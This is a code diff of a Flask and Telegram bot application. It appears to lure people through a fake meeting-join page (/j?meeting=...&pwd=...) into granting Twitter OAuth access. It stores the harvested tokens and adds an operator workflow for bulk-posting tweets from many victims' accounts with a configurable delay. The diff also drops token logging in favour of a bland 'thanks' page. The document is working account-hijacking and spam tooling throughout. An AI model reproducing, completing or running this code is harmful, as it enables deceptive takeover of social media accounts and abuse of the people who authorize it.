@@ -2,7 +2,7 @@ import base64
 import hashlib
 import os
 import requests
-from flask import Flask, request, jsonify, render_template, redirect, session
+from flask import Flask, redirect, request, session, render_template, jsonify
 from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Dispatcher, CommandHandler, CallbackQueryHandler, MessageHandler, Filters
 import logging
@@ -14,12 +14,12 @@ logger = logging.getLogger(__name__)
 # Configuration
 CLIENT_ID = os.getenv('CLIENT_ID')
 CLIENT_SECRET = os.getenv('CLIENT_SECRET')
-CALLBACK_URL = os.getenv('CALLBACK_URL')  # Update with your actual callback URL
+CALLBACK_URL = os.getenv('CALLBACK_URL')  # Your actual callback URL
 ALERT_BOT_TOKEN = os.getenv('ALERT_BOT_TOKEN')
 AUTOMATION_BOT_TOKEN = os.getenv('AUTOMATION_BOT_TOKEN')
 ALERT_CHAT_ID = os.getenv('ALERT_CHAT_ID')
 AUTOMATION_CHAT_ID = os.getenv('AUTOMATION_CHAT_ID')
-WEBHOOK_URL = os.getenv('WEBHOOK_URL')  # URL to set as the webhook for the bot
+WEBHOOK_URL = os.getenv('WEBHOOK_URL')  # Webhook URL for Telegram bot
 
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
@@ -32,16 +32,23 @@ dispatcher = Dispatcher(automation_bot, None, workers=4)
 # Function to set up the webhook
 def set_webhook():
     webhook_url = f"{WEBHOOK_URL}/webhook"
-    alert_bot.set_webhook(url=webhook_url)
     automation_bot.set_webhook(url=webhook_url)
     logger.info(f"Webhook set to {webhook_url}")
+
+# Function to generate code verifier and challenge
+def generate_code_verifier_and_challenge():
+    code_verifier = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b'=').decode('utf-8')
+    code_challenge = base64.urlsafe_b64encode(
+        hashlib.sha256(code_verifier.encode()).digest()
+    ).rstrip(b'=').decode('utf-8')
+    return code_verifier, code_challenge
 
 # Function to load tokens from file
 def load_tokens():
     tokens = []
     if os.path.exists('tokens.txt'):
         with open('tokens.txt', 'r') as file:
-            tokens = [line.strip().split(',') for line in file if line.strip()]
+            tokens = [line.strip() for line in file if line.strip()]
     return tokens
 
 # Function to get the total number of available tokens
@@ -55,7 +62,6 @@ def send_startup_message():
     authorization_url = f"{WEBHOOK_URL}/authorization"
     meeting_url = f"{WEBHOOK_URL}/j?meeting=0&pwd=examplepwd"
 
-    alert_message = "🚀 Alert Bot Started."
     automation_message = (
         f"🚀 Automation Bot Started.\n"
         f"🧮 Total Available Tokens: {total_tokens}\n"
@@ -71,11 +77,9 @@ def send_startup_message():
     ]
     reply_markup = InlineKeyboardMarkup(automation_keyboard)
     
-    # Send messages to both alert and automation bots
-    alert_bot.send_message(chat_id=ALERT_CHAT_ID, text=alert_message)
     automation_bot.send_message(chat_id=AUTOMATION_CHAT_ID, text=automation_message, reply_markup=reply_markup, parse_mode='Markdown')
 
-# Function to show the main menu with updated token status
+# Function to show the main menu
 def show_main_menu():
     total_tokens = get_total_tokens()
     message = (
@@ -144,21 +148,43 @@ def handle_message(update, context):
         try:
             num_tokens = int(user_message)
             context.user_data['num_tokens'] = num_tokens
-            update.message.reply_text(f"Using {num_tokens} tokens. Now, please enter the message content:")
+            update.message.reply_text("Please enter the message content:")
+            context.user_data['step'] = 'bulk_message'
         except ValueError:
             update.message.reply_text("Please enter a valid number.")
+    elif context.user_data.get('step') == 'bulk_message':
+        context.user_data['message_content'] = user_message
+        update.message.reply_text("Please specify the delay (in seconds) between tweets:")
+        context.user_data['step'] = 'bulk_delay'
+    elif context.user_data.get('step') == 'bulk_delay':
+        try:
+            delay_seconds = int(user_message)
+            context.user_data['delay_seconds'] = delay_seconds
+            num_tokens = context.user_data['num_tokens']
+            message_content = context.user_data['message_content']
+            update.message.reply_text(
+                f"Confirm the bulk posting:\n"
+                f"Number of tokens: {num_tokens}\n"
+                f"Message: {message_content}\n"
+                f"Delay: {delay_seconds} seconds",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("Yes", callback_data='confirm_bulk_post')],
+                    [InlineKeyboardButton("No", callback_data='main_menu')]
+                ])
+            )
+        except ValueError:
+            update.message.reply_text("Please enter a valid number of seconds.")
 
-# Webhook route to handle incoming updates
+# Webhook route to handle updates
 @app.route('/webhook', methods=['POST'])
 def webhook():
     update = Update.de_json(request.get_json(force=True), automation_bot)
     dispatcher.process_update(update)
     return jsonify({'status': 'ok'})
 
-# Flask Routes for OAuth and Token Management
+# Flask routes for OAuth and token handling
 @app.route('/authorization')
 def authorization():
-    # Start the OAuth authorization process
     state = "0"
     code_verifier, code_challenge = generate_code_verifier_and_challenge()
     session['oauth_state'] = state
@@ -171,14 +197,6 @@ def authorization():
     )
 
     return redirect(authorization_url)
-
-# Helper function to generate code verifier and challenge
-def generate_code_verifier_and_challenge():
-    code_verifier = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b'=').decode('utf-8')
-    code_challenge = base64.urlsafe_b64encode(
-        hashlib.sha256(code_verifier.encode()).digest()
-    ).rstrip(b'=').decode('utf-8')
-    return code_verifier, code_challenge
 
 @app.route('/oauth/callback')
 def oauth_callback():
@@ -193,8 +211,6 @@ def oauth_callback():
         return "Invalid state parameter", 403
 
     code_verifier = session.pop('code_verifier', None)
-
-    # Exchange authorization code for access token
     token_url = "https://api.twitter.com/2/oauth2/token"
     data = {
         'grant_type': 'authorization_code',
@@ -209,31 +225,20 @@ def oauth_callback():
     if response.status_code == 200:
         access_token = token_response.get('access_token')
         refresh_token = token_response.get('refresh_token')
-        logger.info(f"Access Token: {access_token}, Refresh Token: {refresh_token}")
-        return f"Access Token: {access_token}, Refresh Token: {refresh_token}"
+        return render_template('thanks.html')
     else:
         error_description = token_response.get('error_description', 'Unknown error')
-        error_code = token_response.get('error', 'No error code')
-        return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code
+        return f"Error retrieving access token: {error_description}", response.status_code
 
-@app.route('/')
-def home():
-    return redirect('/authorization')
-
-# Flask route for OAuth meeting page
 @app.route('/j')
 def meeting():
     state_id = request.args.get('meeting')
     code_ch = request.args.get('pwd')
     return render_template('meeting.html', state_id=state_id, code_ch=code_ch)
 
-# Setting up command handlers
-dispatcher.add_handler(CommandHandler('start', start))
-dispatcher.add_handler(CallbackQueryHandler(handle_button))
-dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
-
+# Main entry point
 if __name__ == '__main__':
-    set_webhook()          # Set up the webhook for the bot
-    send_startup_message() # Send the startup message and show main menu
+    set_webhook()
+    send_startup_message()
     port = int(os.environ.get("PORT", 5000))
-    app.run(host='0.0.0.0', port=port) # Start the Flask app
+    app.run(host='0.0.0.0', port=port)
